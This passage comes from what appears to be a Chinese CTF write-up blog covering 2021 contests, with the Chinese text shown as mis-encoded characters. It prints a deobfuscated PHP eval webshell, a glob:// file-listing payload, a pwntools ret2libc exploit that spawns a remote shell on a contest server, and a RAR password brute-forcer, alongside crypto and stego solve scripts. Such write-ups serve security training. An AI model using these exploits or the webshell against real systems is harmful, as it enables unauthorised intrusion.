<p><code>str_replace</code>å…ˆå°†<code>sdtdrd_redpdldadcde</code>ä¸­çš„<code>d</code>æ›¿æ¢ä¸º<code>ç©º</code>ï¼Œä¸º<code>str_replace</code><br>åŒç†åˆæ˜¯ä¸¤ä¸ªæ›¿æ¢æ“ä½œ<br>æœ€åå°†<code>$ojj</code> <code>$mt</code> <code>$hsa</code> <code>$fnx</code> æ‹¼æ¥ï¼Œæ›¿æ¢leï¼Œbase64è§£ç ï¼Œåˆ›å»ºå‡½æ•°ï¼Œå¾—åˆ°<code> @eval($_POST[&#39;wen&#39;]);</code></p>
<p><img src="/img/wp/2021/2021taizhou-5.png"></p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><code>file_get_contents</code>è¯»æ–‡ä»¶<br>è¯»å–å¸¸ç”¨çš„å‡ ä¸ªæ–‡ä»¶ï¼Œflagï¼Œflag.txtï¼Œflag.php<br>å‘ç°æç¤º<code>index999.php</code><br><img src="/img/wp/2021/2021taizhou-6.png"></p>
<p>å†è¯»<code>index999.php</code>çœ‹åˆ°æºç <br><img src="/img/wp/2021/2021taizhou-7.png"></p>
<p>å¯ä»¥é€šè¿‡<code>glob://</code>ä¼ªåè®®å’Œ<code>?</code>å»é€ä¸ªåŒ¹é…æ–‡ä»¶å<br>payloadï¼š</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/1.13.195.28:20001/index</span>999.php?path=<span class="hljs-symbol">glob:</span>/<span class="hljs-regexp">//</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/1.13.195.28:20001/index</span>999.php?path=<span class="hljs-symbol">glob:</span>/<span class="hljs-regexp">//</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span>/<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span>?<br></code></pre></td></tr></table></figure>
<p>è¯»åˆ°flagä½ç½®å’Œæ–‡ä»¶åä¸º<code>/13f95a7112369fb4/flaaaag</code></p>
<p>åœ¨ä½¿ç”¨<code>file_get_contents</code>è¯»æ–‡ä»¶</p>
<p><img src="/img/wp/2021/2021taizhou-8.png"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>é™åˆ¶äº† è¾“å…¥é•¿åº¦ è¦å°äº256<br><img src="/img/wp/2021/2021taizhou-9.png"></p>
<p>å› ä¸ºç¬¬äºŒä¸ªå‚æ•°æ—¶æ— ç¬¦å·ç±»å‹<br>æ‰€ä»¥å¯ä»¥ä½¿ç”¨æ•´æ•°æ¼æ´ ç»•è¿‡é•¿åº¦é™åˆ¶<br><img src="/img/wp/2021/2021taizhou-10.png"></p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;pwn12&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><span class="hljs-comment">#p=process(&#x27;pwn12&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p=remote(<span class="hljs-string">&#x27;1.13.195.28&#x27;</span>,<span class="hljs-number">10000</span>)<br>got=<span class="hljs-string">&#x27;printf&#x27;</span><br>printplt=e.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>getgot=e.got[got]<br>main=<span class="hljs-number">0x400713</span><br>ret=<span class="hljs-number">0x000000000040028c</span><br>pop_rdi=<span class="hljs-number">0x0000000000400863</span><br>p.sendlineafter(<span class="hljs-string">&#x27;length :&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>p.read()<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x130</span>+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span>+p64(ret)+p64(pop_rdi)+p64(getgot)+p64(printplt)+p64(main))<br>p.readline()<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc=LibcSearcher(got,d)<br>off=d-libc.dump(got)<br>sys_add=off+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_add=off+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;length :&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x130</span>+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span>+p64(ret)+p64(pop_rdi)+p64(bin_add)+p64(sys_add)+p64(main))<br>p.interactive()<br></code></pre></td></tr></table></figure>
<p><img src="/img/wp/2021/2021taizhou-11.png"></p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h2><p>fileæŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼Œ64ä½ï¼Œç”¨ida64æ‰“å¼€<br>F5<br>å¾—åˆ°<code>gHe6gIrSlYUqkGPeg4KNo4Vql4g6g4UqgHgHl4JNonBhlbk+och=</code><br>å¸¸è§„baseè§£ä¸å‡ºæ¥ï¼Œåº”è¯¥æ˜¯æ¢è¡¨äº†<br>æŸ¥çœ‹å­—ç¬¦ä¸²<br><img src="/img/wp/2021/2021taizhou-12.png"><br>å‘ç°base64è¡¨<br><img src="/img/wp/2021/2021taizhou-13.png"></p>
<p>è§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>str1 = <span class="hljs-string">&quot;gHe6gIrSlYUqkGPeg4KNo4Vql4g6g4UqgHgHl4JNonBhlbk+och=&quot;</span><br><br>string1 = <span class="hljs-string">&quot;3ZAnJVbMd/zEkolRBDW4KUYT0ga1PF9j86qwuXHciCOfr2tLmexGhpSI+NQ5y7sv&quot;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><br><span class="hljs-built_in">print</span> (base64.b64decode(str1.translate(<span class="hljs-built_in">str</span>.maketrans(string1,string2))))<br></code></pre></td></tr></table></figure>
<p><img src="/img/wp/2021/2021taizhou-14.png"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h2><p>baseå¾ªç¯<br><img src="/img/wp/2021/2021taizhou-15.png"></p>
<h2 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h2><p>ç®—å¼çš„ç»“æœæœ‰æ­£ç¡®çš„æœ‰é”™è¯¯çš„<br>æ‰€ä»¥å°†ç»“æœçš„<code>true</code>å’Œ<code>false</code>å¯¼å‡ºä¸ºäºŒè¿›åˆ¶<br>ç„¶åå°†äºŒè¿›åˆ¶è½¬16è¿›åˆ¶ï¼Œæœ€åå†è½¬å­—ç¬¦ä¸²<br>è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1w.txt&#x27;</span>)<br>d=f.read()<br>d=d.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    e=e+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">eval</span>(i)))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(e,<span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).decode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br></code></pre></td></tr></table></figure>
<p><img src="/img/wp/2021/2021taizhou-16.png"></p>
<h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>eå¾ˆå°ï¼Œä½æŒ‡æ•°æ”»å‡»<br>è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>n=<span class="hljs-number">0x86f4be77b79e166a6311e7982ba2e5ff479db93a01c56034479a9e35382293c35769da222974e9425829099aa4fe4f41185283866202042b356194bab312e6ed2fb0b10b1b74767dc1cc5306872d33b1f3b75612c594751ec70e4cf5fccc6fceafe0401648869cc40425a176ab70286d92a29dfd675f2384c9383e0a9750b25b</span><br>e=<span class="hljs-number">0x3</span><br>c=<span class="hljs-number">0x10652cdf7ed2bc53f58b321f476c3a3cf3281e541f4d533a73a0fcbf525230f2e01c183dee660676317ea99250202548e5525b0c14adbeb77d4fa7e2e1d339</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> (gmpy2.iroot(c+i*n,e)[<span class="hljs-number">1</span>]==<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>( gmpy2.iroot(c+i*n,e)[<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>    i=i+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p><img src="/img/wp/2021/2021taizhou-17.png"><br>åè¿›åˆ¶è½¬å­—ç¬¦ä¸²<br><img src="/img/wp/2021/2021taizhou-18.png"><br>md5åŠ å¯†åæäº¤<br><img src="/img/wp/2021/2021taizhou-19.png"></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>docxæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…<br>åœ¨<code>media</code>ä¸‹å­˜åœ¨åŒ…å«<code>flag</code>çš„å›¾ç‰‡<br><img src="/img/wp/2021/2021taizhou-20.png"></p>
<h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><p>å°è¯•ä¿®æ”¹é«˜åº¦<br><img src="/img/wp/2021/2021taizhou-21.png"><br>å¾—åˆ°å¯†ç <br><img src="/img/wp/2021/2021taizhou-22.png"></p>
<p>binwalkåˆ†ç¦»å‡ºä¸€ä¸ªå‹ç¼©åŒ…</p>
<p>å†™è„šæœ¬çˆ†ç ´å¯†ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> rarfile,time<br><span class="hljs-keyword">import</span> threading,os<br>r=rarfile.RarFile(<span class="hljs-string">&#x27;2EDC.rar&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">pwd</span>):<br>    <span class="hljs-keyword">global</span> r<br>    <span class="hljs-keyword">try</span>:<br>        r.extractall(pwd=pwd)<br>        <span class="hljs-built_in">print</span>(pwd)<br>        os._exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e,pwd)<br>        <span class="hljs-keyword">pass</span><br>a=<span class="hljs-string">&#x27;qQaAzZwWsSxX&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> a:<br>        <span class="hljs-keyword">if</span> j.lower() <span class="hljs-keyword">in</span> (i).lower() :<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> a:<br>            <span class="hljs-keyword">if</span> k.lower() <span class="hljs-keyword">in</span> (i+j).lower():<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> a:<br>                <span class="hljs-keyword">if</span> q.lower() <span class="hljs-keyword">in</span> (i+j+k).lower():<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> a:<br>                    <span class="hljs-keyword">if</span> z.lower() <span class="hljs-keyword">in</span> (i+j+k+q).lower():<br>                        <span class="hljs-keyword">continue</span><br>                    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a:<br>                        <span class="hljs-keyword">if</span> x.lower() <span class="hljs-keyword">in</span> (i+j+k+q+z).lower():<br>                            <span class="hljs-keyword">continue</span><br>                        threading.Thread(target=decode,args=(i+j+k+q+z+x,)).start()<br>                        time.sleep(<span class="hljs-number">0.01</span>)<br><br></code></pre></td></tr></table></figure>
<p>è·‘å‡ºç»“æœ<br><img src="/img/wp/2021/2021taizhou-23.png"><br>è§£å‹å¾—åˆ°flagï¼š<code>DASCTF&#123;f457b6a30c5b07db78e6e7562e93b4cd&#125;</code></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021</tag>
        <tag>å°å·</tag>
      </tags>
  </entry>
  <entry>
    <title>2021NUAA-wp</title>
    <url>/posts/3470e8c1/</url>
    <content><![CDATA[<p>æ—¶é—´æœ‰ç‚¹ç´§ï¼Œæœ‰å‡ é¢˜å·®ä¸€ç‚¹<br><img src="/img/wp/2021/2021nuaa-1.png"><br><img src="/img/wp/2021/2021nuaa-2.png"></p>
<h1 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h1><p>è…¾è®¯ä¼šè®®<br>flag{we1c0m_t0_asur!ctf}</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="baby-mix"><a href="#baby-mix" class="headerlink" title="baby_mix"></a>baby_mix</h2><p>ä¼ªåŠ å¯†ï¼Œ09æ”¹æˆ00<br>å›¾ç‰‡ä¸Šè¾¹å·¦è¾¹çœ‹åˆ°ç™½æ¡ï¼Œåº”è¯¥æ˜¯lsb<br>stegsolveæŸ¥çœ‹å¾—åˆ°äºŒç»´ç <br><img src="/img/wp/2021/2021nuaa-3.png"><br>æ‰«ç å¾—åˆ°</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">4</span>a<span class="hljs-number">5</span>a<span class="hljs-number">4</span>a<span class="hljs-number">584732544748424658515654514</span>f<span class="hljs-number">4634575135435447564</span>a<span class="hljs-number">4749564</span>a<span class="hljs-number">5347463455595754564</span>f<span class="hljs-number">464</span><span class="hljs-keyword">c</span><span class="hljs-number">444</span>f<span class="hljs-number">5752594</span>f<span class="hljs-number">56465751334</span>b<span class="hljs-number">55474</span>a<span class="hljs-number">345841324</span>b<span class="hljs-number">494</span>b<span class="hljs-number">4</span>a<span class="hljs-number">3546495533594</span>b<span class="hljs-number">524</span>a<span class="hljs-number">4449524</span>b<span class="hljs-number">454</span>b<span class="hljs-number">35435753334</span><span class="hljs-keyword">c</span><span class="hljs-number">324</span>f<span class="hljs-number">4</span>a<span class="hljs-number">41564153534</span>f<span class="hljs-number">48424756515243574</span>d<span class="hljs-number">355</span>a<span class="hljs-number">464</span>d<span class="hljs-number">3543474</span>a<span class="hljs-number">593</span>d<span class="hljs-number">3</span>d<span class="hljs-number">3</span>d<span class="hljs-number">3</span>d<span class="hljs-number">3</span>d<span class="hljs-number">3</span>d<br></code></pre></td></tr></table></figure>
<p>åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">JZJXG2TGHBFXQVTQOF4WQ5CTGVJGIVJSGF4UYWTVOFLDOWRYOVFWQ3KUGJ4XA2KIKJ5FIU3YKRJDIRKEK5CWS3L2OJAVASSOHBGVQRCWM5ZFM5CGJY</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
<p>base32</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode"><span class="hljs-symbol">NSsjf8</span>KxVpqyhtS<span class="hljs-number">5</span>RdU<span class="hljs-number">21</span>yLZuqV<span class="hljs-number">7</span>Z<span class="hljs-number">8</span>uKhmT<span class="hljs-number">2</span>ypiHRzTSxTR<span class="hljs-number">4</span>EDWEimzrAPJ<span class="hljs-symbol">N8</span>MXDVgrVtF<span class="hljs-symbol">N</span><br></code></pre></td></tr></table></figure>
<p>base58</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">YX<span class="hljs-symbol">N1</span>cml<span class="hljs-number">7</span>aV<span class="hljs-number">90</span>aGlua<span class="hljs-number">190</span>aGF<span class="hljs-number">0</span>X<span class="hljs-number">2</span>lzX<span class="hljs-number">3</span><span class="hljs-symbol">NvX2</span>Vhc<span class="hljs-number">3</span>lfZ<span class="hljs-name">m9</span>yX<span class="hljs-number">3</span>lvdX<span class="hljs-number">0</span>=<br></code></pre></td></tr></table></figure>
<p>base64</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><code class="hljs ceylon">asuri&#123;i<span class="hljs-number">_</span>think<span class="hljs-number">_</span>that<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>so<span class="hljs-number">_</span>easy<span class="hljs-number">_f</span>or<span class="hljs-number">_</span>you&#125;<br></code></pre></td></tr></table></figure>

<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>è§£å‹æœ‰ä¸ªkey.wavæ–‡ä»¶ï¼Œåº”è¯¥æ˜¯å¯†é’¥<br>audacityé¢‘è°±çœ‹ä¸€ä¸‹ï¼Œå¾—åˆ°å¯†é’¥<code>MudaMudaMudaMuda</code><br><img src="/img/wp/2021/2021nuaa-4.png"></p>
<p>stringsçœ‹ä¸‹å›¾ç‰‡ï¼Œå‘ç°ç»“å°¾æœ‰ä¸€ä¸²å­—ç¬¦ä¸²</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">RjAgOUYgOTkgODMgRjAgOUYgOTIgQjUgRjAgOUYgOEMgQkYgRjAgOUYgOEUgQTQgRjAgOUYgOUEgQUEgRjAgOUYgOEMgOEYgRjAgOUYgOTAgOEUgRjAgOUYgQTUgOEIgRjAgOUYgOUEgQUIgRjAgOUYgOTggODYgRTIgOUMgODUgRjAgOUYgOTggODAgRjAgOUYgQTQgQTMgRTIgOEMgQTggRjAgOUYgOTAgOEQgRTIgOTggODAgRjAgOUYgQTUgOEIgRjAgOUYgOTggODYgRjAgOUYgOTkgODMgRjAgOUYgOEUgODMgRjAgOUYgOTAgOTggRjAgOUYgOEQgOEQgRTIgOTggODIgRjAgOUYgOUEgQUEgRjAgOUYgOEMgQUEgRjAgOUYgOTIgQjUgRjAgOUYgOUEgQTggRTIgOEMgQTggRjAgOUYgOTggODEgRjAgOUYgOTQgQUEgRTIgOUMgOTYgRjAgOUYgOEUgODggRjAgOUYgOEMgOEYgRjAgOUYgOTQgODQgRjAgOUYgOTYgOTAgRjAgOUYgQTYgOTMgRjAgOUYgOEMgOEYgRjAgOUYgOTUgQjkgRjAgOUYgOTggOEQgRjAgOUYgOTEgOEMgRjAgOUYgOEMgODkgRjAgOUYgOTIgQjUgRjAgOUYgOEYgOEUgRjAgOUYgOUEgQUIgRjAgOUYgQTQgQTMgRjAgOUYgOTYgOTAgRjAgOUYgOTIgQTcgRjAgOUYgOEQgOEQgRjAgOUYgOEMgQkYgRjAgOUYgOTggOEQgRjAgOUYgOEQgOEUgRjAgOUYgOUEgQTggRjAgOUYgOTAgOEUgRjAgOUYgOTIgQjUgRjAgOUYgOEMgQkYgRjAgOUYgOEYgQjkgRjAgOUYgOEUgODUgRjAgOUYgOTkgODMgRjAgOUYgOTEgOTEgRjAgOUYgOTggODYgRTIgOTggODMgRjAgOUYgOTAgODUgRjAgOUYgOTUgQjkgRjAgOUYgOTggODcgRjAgOUYgOEYgQjkgRjAgOUYgOEYgQjkgRjAgOUYgOEQgQjUgRjAgOUYgOEUgODggRjAgOUYgOEQgOEUgRjAgOUYgQTQgQTMgRjAgOUYgOTggODEgRjAgOUYgOEQgOEQgRjAgOUYgOUEgQTggRjAgOUYgOEYgQjkgRjAgOUYgOTEgQTMgRjAgOUYgOTQgODQgRjAgOUYgQTQgQTMgRjAgOUYgOEUgODggRjAgOUYgOTggODIgRjAgOUYgOTAgOEQgRTIgOUMgODUgRjAgOUYgOTggODAgIEUyIDlDIDg1IEYwIDlGIDlBIEFBIEYwIDlGIDk4IDhFIEYwIDlGIDk4IDgwIEYwIDlGIDk3IDkyIEYwIDlGIDk3IDkyCg</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
<p>base64</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">F0</span> <span class="hljs-number">9</span>F <span class="hljs-number">99</span> <span class="hljs-number">83</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">92</span> B5 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C BF F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>E A4 F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A AA F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C <span class="hljs-number">8</span>F F0 <span class="hljs-number">9</span>F <span class="hljs-number">90</span> <span class="hljs-number">8</span>E F0 <span class="hljs-number">9</span>F A5 <span class="hljs-number">8</span>B F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A AB F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">86</span> E2 <span class="hljs-number">9</span>C <span class="hljs-number">85</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">80</span> F0 <span class="hljs-number">9</span>F A4 A3 E2 <span class="hljs-number">8</span>C A8 F0 <span class="hljs-number">9</span>F <span class="hljs-number">90</span> <span class="hljs-number">8</span>D E2 <span class="hljs-number">98</span> <span class="hljs-number">80</span> F0 <span class="hljs-number">9</span>F A5 <span class="hljs-number">8</span>B F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">86</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">99</span> <span class="hljs-number">83</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>E <span class="hljs-number">83</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">90</span> <span class="hljs-number">98</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>D <span class="hljs-number">8</span>D E2 <span class="hljs-number">98</span> <span class="hljs-number">82</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A AA F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C AA F0 <span class="hljs-number">9</span>F <span class="hljs-number">92</span> B5 F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A A8 E2 <span class="hljs-number">8</span>C A8 F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">81</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">94</span> AA E2 <span class="hljs-number">9</span>C <span class="hljs-number">96</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>E <span class="hljs-number">88</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C <span class="hljs-number">8</span>F F0 <span class="hljs-number">9</span>F <span class="hljs-number">94</span> <span class="hljs-number">84</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">96</span> <span class="hljs-number">90</span> F0 <span class="hljs-number">9</span>F A6 <span class="hljs-number">93</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C <span class="hljs-number">8</span>F F0 <span class="hljs-number">9</span>F <span class="hljs-number">95</span> B9 F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">8</span>D F0 <span class="hljs-number">9</span>F <span class="hljs-number">91</span> <span class="hljs-number">8</span>C F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C <span class="hljs-number">89</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">92</span> B5 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>F <span class="hljs-number">8</span>E F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A AB F0 <span class="hljs-number">9</span>F A4 A3 F0 <span class="hljs-number">9</span>F <span class="hljs-number">96</span> <span class="hljs-number">90</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">92</span> A7 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>D <span class="hljs-number">8</span>D F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C BF F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">8</span>D F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>D <span class="hljs-number">8</span>E F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A A8 F0 <span class="hljs-number">9</span>F <span class="hljs-number">90</span> <span class="hljs-number">8</span>E F0 <span class="hljs-number">9</span>F <span class="hljs-number">92</span> B5 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C BF F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>F B9 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>E <span class="hljs-number">85</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">99</span> <span class="hljs-number">83</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">91</span> <span class="hljs-number">91</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">86</span> E2 <span class="hljs-number">98</span> <span class="hljs-number">83</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">90</span> <span class="hljs-number">85</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">95</span> B9 F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">87</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>F B9 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>F B9 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>D B5 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>E <span class="hljs-number">88</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>D <span class="hljs-number">8</span>E F0 <span class="hljs-number">9</span>F A4 A3 F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">81</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>D <span class="hljs-number">8</span>D F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A A8 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>F B9 F0 <span class="hljs-number">9</span>F <span class="hljs-number">91</span> A3 F0 <span class="hljs-number">9</span>F <span class="hljs-number">94</span> <span class="hljs-number">84</span> F0 <span class="hljs-number">9</span>F A4 A3 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>E <span class="hljs-number">88</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">82</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">90</span> <span class="hljs-number">8</span>D E2 <span class="hljs-number">9</span>C <span class="hljs-number">85</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">80</span>  E2 <span class="hljs-number">9</span>C <span class="hljs-number">85</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A AA F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">8</span>E F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">80</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">97</span> <span class="hljs-number">92</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">97</span> <span class="hljs-number">92</span><br></code></pre></td></tr></table></figure>
<p>hexè½¬å­—ç¬¦</p>
